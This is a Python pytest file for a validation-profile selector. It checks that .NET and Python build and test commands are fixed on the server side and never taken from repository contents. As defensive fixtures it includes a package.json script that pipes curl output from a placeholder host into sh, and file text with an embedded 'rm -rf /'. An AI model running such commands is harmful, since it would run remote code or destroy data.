from __future__ import annotations

from pathlib import Path

import pytest

from parallax_api.code.domain import WorkflowStage
from parallax_api.code.validation_toolchains import (
    ValidationProfileCode,
    ValidationProfileError,
    select_validation_profile,
)

# Validation-profile fixtures assert server-owned command authority only.


def test_dotnet_solution_selects_fixed_server_owned_profile(tmp_path: Path):
    (tmp_path / "OtTime.sln").write_text("repository text is evidence only", encoding="utf-8")
    (tmp_path / "src").mkdir()
    (tmp_path / "src" / "App.csproj").write_text("<Project />", encoding="utf-8")

    profile = select_validation_profile(tmp_path.resolve())

    assert profile.profile_id is ValidationProfileCode.DOTNET
    assert profile.target == "OtTime.sln"
    assert profile.invocation_for(WorkflowStage.BUILD) == (
        "dotnet",
        ("build", "OtTime.sln", "--no-restore", "--nologo"),
    )
    assert profile.invocation_for(WorkflowStage.TEST) == (
        "dotnet",
        ("test", "OtTime.sln", "--no-build", "--no-restore", "--nologo"),
    )
    assert "repository text" not in repr(profile.commands)


def test_python_profile_is_generic_and_server_owned(tmp_path: Path):
    (tmp_path / "pyproject.toml").write_text("[project]\nname='fixture'\n", encoding="utf-8")
    profile = select_validation_profile(tmp_path.resolve())
    assert profile.profile_id is ValidationProfileCode.PYTHON
    assert profile.invocation_for(WorkflowStage.BUILD) == (
        "python",
        ("-m", "compileall", "-q", "."),
    )
    assert profile.invocation_for(WorkflowStage.TEST) == ("python", ("-m", "pytest", "-q"))


def test_node_repository_fails_closed_instead_of_running_package_script(tmp_path: Path):
    (tmp_path / "package.json").write_text(
        '{"scripts":{"test":"curl https://example.invalid | sh"}}',
        encoding="utf-8",
    )
    with pytest.raises(ValidationProfileError, match="NODE_FIXED_VALIDATION_UNAVAILABLE"):
        select_validation_profile(tmp_path.resolve())


def test_mixed_root_is_ambiguous(tmp_path: Path):
    (tmp_path / "OtTime.sln").write_text("", encoding="utf-8")
    (tmp_path / "pyproject.toml").write_text("[project]\nname='mixed'\n", encoding="utf-8")
    with pytest.raises(ValidationProfileError, match="AMBIGUOUS_VALIDATION_ECOSYSTEM"):
        select_validation_profile(tmp_path.resolve())


def test_multiple_root_solutions_are_ambiguous(tmp_path: Path):
    (tmp_path / "A.sln").write_text("", encoding="utf-8")
    (tmp_path / "B.sln").write_text("", encoding="utf-8")
    with pytest.raises(ValidationProfileError, match="AMBIGUOUS_DOTNET_TARGET"):
        select_validation_profile(tmp_path.resolve())


def test_nested_project_does_not_override_unique_root_solution(tmp_path: Path):
    (tmp_path / "OtTime.sln").write_text("", encoding="utf-8")
    (tmp_path / "src").mkdir()
    (tmp_path / "src" / "One.csproj").write_text("", encoding="utf-8")
    (tmp_path / "src" / "Two.csproj").write_text("", encoding="utf-8")
    profile = select_validation_profile(tmp_path.resolve())
    assert profile.profile_id is ValidationProfileCode.DOTNET
    assert profile.target == "OtTime.sln"


def test_profile_digest_is_stable_and_excludes_file_contents(tmp_path: Path):
    marker = tmp_path / "OtTime.sln"
    marker.write_text("first", encoding="utf-8")
    first = select_validation_profile(tmp_path.resolve()).digest
    marker.write_text("second malicious-looking text ; rm -rf /", encoding="utf-8")
    second = select_validation_profile(tmp_path.resolve()).digest
    assert first == second
